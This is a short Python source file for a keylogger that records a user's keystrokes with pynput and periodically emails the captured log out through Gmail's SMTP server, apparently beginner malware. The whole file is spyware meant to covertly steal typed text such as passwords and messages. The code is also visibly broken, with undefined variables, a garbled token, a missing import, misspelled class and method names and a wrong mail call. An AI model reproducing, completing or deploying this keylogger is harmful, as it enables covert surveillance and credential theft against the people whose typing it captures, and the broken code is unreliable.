import pynput.keyboard
import threading


class KeyLogger:


	def __init__(self, time_interval, email, password):
		self.log = ""
		self.interval = time_interval
		self.email = email
		self.password = password



	def append_to_log(self,string):
		self.log = self.log + string



	def process_key_press(self,key):	
		try:
			log = log + str(key.char)
		except AttributeError:
			if key == key.space:
				log = log + " "
			else:
				log = log + " " + str(key) + " "
		self.append_to_log(current_k	ey)



	def send_mail(email,password,message):
		server = smtplib.SMTP("smtp.gmail.com")
		server.starttls()
		server.login(email,password)
		server.send_mail(email,password,message)
		server.quit()


	def report(self):		
		self.send_mail(self.email, self.password, self.log)
		self.log = ""
		timer = threading.Timer(5,self.report)
		timer.start()



	def start(self):
		keyboard_listner = pynput.keyboard.Listner(on_press = self.process_key_press)

		with keyboard_listner:
			self.report()
			keyboard_listner.join()




myKeyLogger = Keylogger(120,"email","password")
myKeyLogger.start()